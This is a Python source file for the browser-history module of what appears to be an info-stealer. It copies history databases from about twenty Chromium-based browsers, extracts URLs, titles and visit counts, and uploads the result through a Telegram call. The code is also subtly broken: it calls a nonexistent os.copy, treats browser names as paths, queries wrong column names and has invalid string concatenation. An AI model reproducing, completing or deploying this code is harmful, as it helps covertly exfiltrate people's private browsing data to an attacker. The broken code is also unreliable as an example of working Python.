import os
import sqlite3
from datetime import datetime, timedelta

class History:
    def __init__(self):
        self.browsers = ["Google Chrome", "Chromium", "Opera", "Brave", "Vivaldi", "Orbitum", "Mail.Ru", "Kometa", "Comodo", "Torch", "Slimjet", "360Browser", "Maxthon3", "K-Melon", "Sputnik", "Nichrome", "CocCoc", "uCozMedia", "Chromodo", "Yandex"]
        self.history_file = "history.txt"

    def get(self):
        # Search all browsers
        for browser in self.browsers:
            if os.path.exists(browser):
                temp_history_location = os.environ["temp"] + "\\browserHistory"
                if os.path.exists(temp_history_location):
                    os.remove(temp_history_location)
                os.copy(browser, temp_history_location)

                # Read chrome database
                conn = sqlite3.connect(temp_history_location)
                c = conn.cursor()
                c.execute("SELECT urls, titles, visits, times FROM urls")
                rows = c.fetchall()

                # Add data to output
                output = ""
                for row in rows:
                    url = row[0]
                    title = row[1]
                    visits = int(row[2])
                    time = row[3]

                    # If no data, break
                    if not url:
                        break

                    output += f"URL: {url}\n"
                           + f"TITLE: {title}\n"
                           + f"VISITS: {visits}\n"
                           + f"DATE: {time}\n"
                           + "\n"

                # Send
                with open(self.history_file, "w") as f:
                    f.write(output)
                Telegram.upload_file(self.history_file, True)
